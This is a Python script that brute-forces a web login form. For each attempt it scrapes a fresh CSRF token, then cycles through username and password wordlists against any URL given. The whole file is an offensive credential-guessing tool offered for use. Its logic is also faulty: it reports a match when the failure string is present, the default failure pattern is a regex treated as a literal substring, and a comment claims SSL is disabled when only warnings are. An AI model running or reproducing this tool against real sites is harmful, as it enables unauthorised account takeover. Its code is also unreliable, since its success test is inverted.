import argparse
import re
import sys
import time

import requests

# turn off SSL TLS
requests.packages.urllib3.disable_warnings()


def get_csrf(session, url):
    request = session.get(url, timeout=10)
    token = re.search(r'name="csrf" value="([^"]+)"', request.text)

    # m.group(0)  # 'name="csrf" value="a8f9200218af717c"'  ← 매치된 전체
    # m.group(1)  # 'a8f9200218af717c'                     ← 괄호(1번 그룹) 안만 딱
    return token.group(1) if token else None


def attempt(url, user, pw, fail_str, verbose):
    session = requests.Session()
    csrf = get_csrf(session, url)
    if csrf is None:
        print(f"[!] none CSRF token")
        sys.exit(1)

    request = session.post(
        url=url,
        data={
            "username": user,
            "password": pw,
            "login_submit": "Log In",
            "csrf": csrf,
        },
        timeout=10,
        allow_redirects=True,
    )

    if fail_str is None:
        fail_str = "invalid|error|wrong|incorrect|denied|failed"

    if verbose:
        print(f"[-] {user}:{pw}")

    return fail_str in request.text


def main():
    p = argparse.ArgumentParser(description="login brute force with CSRF")
    p.add_argument("-t", "--url", required=True, help="login form url")
    p.add_argument("-U", "--users", required=True, help="usernames file path")
    p.add_argument("-P", "--passwords", required=True, help="passwords file path")
    p.add_argument("-F", "--failstring", required=False, help="fail string")
    p.add_argument(
        "--delay", type=float, required=False, default=0, help="delay float type"
    )
    p.add_argument("-v", "--verbose", action="store_true", help="verbose mode")

    args = p.parse_args()
    users = [l.strip() for l in open(args.users) if l.strip()]
    passwords = [l.strip() for l in open(args.passwords) if l.strip()]
    print(
        f"[*] users={len(users)} passwords={len(passwords)} total={len(users) * len(passwords)}"
    )

    for user in users:
        found = False
        for pw in passwords:
            try:
                if attempt(args.url, user, pw, args.failstring, args.verbose):
                    print(f"[+] found: {user}:{pw}")
                    found = True
                    break
            except requests.RequestException as e:
                print(f"[!] failed {user}:{pw}, error: {e}")

            if args.delay:
                time.sleep(args.delay)

        if not found:
            print(f"[-] {user}: not found")


if __name__ == "__main__":
    main()
